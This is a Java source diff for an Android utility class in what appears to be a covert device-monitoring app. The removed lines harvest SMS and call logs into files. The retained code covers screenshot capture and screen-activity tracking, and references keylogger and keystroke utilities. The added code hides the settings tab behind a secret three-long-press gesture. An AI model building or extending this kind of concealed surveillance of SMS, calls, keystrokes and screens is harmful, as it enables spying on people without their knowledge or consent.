@@ -1,110 +1,118 @@
 package com.vikasyadavnsit.cdc.utils;
 
 import static android.app.Activity.RESULT_OK;
-import static androidx.core.content.ContextCompat.registerReceiver;
+import static android.content.Context.ALARM_SERVICE;
 import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;
 
 import android.app.Activity;
+import android.app.AlarmManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
+import android.os.CountDownTimer;
+import android.os.Handler;
 import android.provider.Settings;
-import android.widget.Button;
+import android.view.MotionEvent;
+import android.view.View;
+import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.vikasyadavnsit.cdc.R;
-import com.vikasyadavnsit.cdc.enums.FileMap;
 import com.vikasyadavnsit.cdc.fragment.HomeFragment;
+import com.vikasyadavnsit.cdc.fragment.PlayFragment;
 import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
-import com.vikasyadavnsit.cdc.permissions.PermissionManager;
 import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
 import com.vikasyadavnsit.cdc.services.ScreenshotService;
 
 public class ActionUtils {
 
+    private static Handler handler = new Handler();
+    private static boolean isLongPress = false;
+    private static boolean isCounting = false;
+    private static int pressCount = 0;
+    private static CountDownTimer countDownTimer;
+    private static Activity context;
 
-    public static void handleButtonPress(AppCompatActivity activity, int... viewIds) {
-        ActionUtils actionUtils = new ActionUtils();
-        for (int viewId : viewIds) {
-            handleButtonPress(activity, viewId);
-        }
-    }
+    public static void handleButtonPress(AppCompatActivity activity) {
+        context = activity;
 
-    public static void handleButtonPress(AppCompatActivity activity, int viewId) {
-
-        Button actionButton = activity.findViewById(viewId);
-
-        if (R.id.main_navigation_request_play_button == viewId) {
-            actionButton.setOnClickListener(view -> {
-                new PermissionManager().requestAllPermissions(activity);
-
-                // Mysterious observation is that :
-                // If multiple setting intents are called all of them will open up in parallel window in background.
-                //requestExactAlarmPermission(activity);
-
-                //KeyLoggerUtils.startAccessibilitySettingIntent(activity);
-
-                // Register the receiver for screen off, screen on, and user present actions
-                IntentFilter filter = new IntentFilter();
-                filter.addAction(Intent.ACTION_SCREEN_OFF);
-                filter.addAction(Intent.ACTION_SCREEN_ON);
-                filter.addAction(Intent.ACTION_USER_PRESENT);
-                activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
-
-                // FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages(activity, FileMap.CONTACTS));
-
-                //ScreenshotService.setTakeScreenshot(true);
-                //ScreenshotService.setStopScreenshotService(true);
-
+        //Handle Button Presses
+        activity.findViewById(R.id.main_navigation_request_play_button).setOnClickListener(view -> {
+            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new PlayFragment());
 //                DatabaseUtil dbUtils = new DatabaseUtil(activity, AppConstants.CDC_DATABASE_NAME, AppConstants.CDC_DATABASE_PATH);
 //                dbUtils.createTable(DBConstants.CREATE_APPLICATION_DATA_TABLE);
 //                dbUtils.insertIntoApplicationData( "SENSOR_READ_INTERVAL_IN_MS", "600000");
 //                dbUtils.insertIntoApplicationData( "SENSOR_READ_DURATION_IN_MS", "5000");
 //                dbUtils.insertIntoApplicationData( "CAPTURE_SCREEN_SHOT", "TRUE");
 
+            //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
+        });
 
-                //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
-                //CDCSensorService.startSensorService(activity);
-                //CDCSensorService.stopSensorService(activity);
-            });
-        } else if (R.id.main_navigation_request_home_button == viewId) {
-            actionButton.setOnClickListener(view -> {
-                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
-                CallUtils.monitorCallState(activity);
-                FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages(activity, FileMap.SMS));
-                FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages(activity, FileMap.CALL));
-            });
-        } else if (R.id.main_navigation_request_settings_button == viewId) {
-            actionButton.setOnClickListener(view -> {
-                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
-                new PermissionManager().requestAllPermissions(activity);
-                //permissionHandler.resetAllPermissionManually(this);
-                //KeyLoggerUtils.startAccessibilitySettingIntent(activity);
-                FileUtils.startFileAccessSettings(activity);
-            });
-        }
-    }
+        activity.findViewById(R.id.main_navigation_request_home_button).setOnClickListener(view -> {
+            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
+        });
+        activity.findViewById(R.id.main_navigation_request_settings_button).setOnClickListener(view -> {
+            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
+        });
 
 
-    public static void requestExactAlarmPermission(Activity activity) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
-            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            activity.startActivity(intent);
-        }
-    }
+        //Handle Touch Listeners
+        activity.findViewById(R.id.main_navigation_request_home_button).setOnTouchListener(new View.OnTouchListener() {
+            @Override
+            public boolean onTouch(View v, MotionEvent event) {
+                switch (event.getAction()) {
+                    case MotionEvent.ACTION_DOWN:
+                        isLongPress = false;
+                        handler.postDelayed(settingEnablerRunnable, 3000); // 5 seconds
+                        return true;
 
-    public static void startMediaProjectionService(Activity activity) {
-        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
+                    case MotionEvent.ACTION_UP:
+                    case MotionEvent.ACTION_CANCEL:
+                        if (!isLongPress) {
+                            handler.removeCallbacks(settingEnablerRunnable);
+                        }
+                        return true;
+                }
+                return false;
+            }
+        });
     }
 
     public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
         LoggerUtils.d("CommonUtil", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
         createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
+    }
+
+    public static void registerPhoneStatistics(Activity activity) {
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(Intent.ACTION_SCREEN_OFF);
+        filter.addAction(Intent.ACTION_SCREEN_ON);
+        filter.addAction(Intent.ACTION_USER_PRESENT);
+        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
+    }
+
+    public static void requestExactAlarmPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+        }
+    }
+
+    public static boolean canScheduleExactAlarms() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
+            return alarmManager.canScheduleExactAlarms();
+        }
+        return true; // For older versions, exact alarms are always allowed
+    }
+
+    public static void startMediaProjectionService(Activity activity) {
+        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
     }
 
     private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
@@ -117,5 +125,41 @@ public class ActionUtils {
             }
         }
     }
+
+    private static Runnable settingEnablerRunnable = () -> {
+        isLongPress = true;
+        pressCount++;
+        // Check if the pressCount reaches 3 within 30 seconds
+        if (pressCount == 3) {
+            Toast.makeText(context, "Settings Tab Enabled", Toast.LENGTH_SHORT).show();
+            context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.VISIBLE);
+        }
+
+        // If the timer is not running, start the 30-second timer
+        if (!isCounting) {
+            startCountDown();
+        }
+    };
+
+    private static void startCountDown() {
+        isCounting = true;
+        countDownTimer = new CountDownTimer(20000, 1000) { // 30 seconds countdown
+            @Override
+            public void onTick(long millisUntilFinished) {
+                // No action needed on each tick
+            }
+
+            @Override
+            public void onFinish() {
+                isCounting = false;
+                if (pressCount < 3) {
+                    context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.GONE);
+                }
+                pressCount = 0; // Reset press count after 30 seconds
+            }
+        };
+        countDownTimer.start();
+    }
+
 
 }
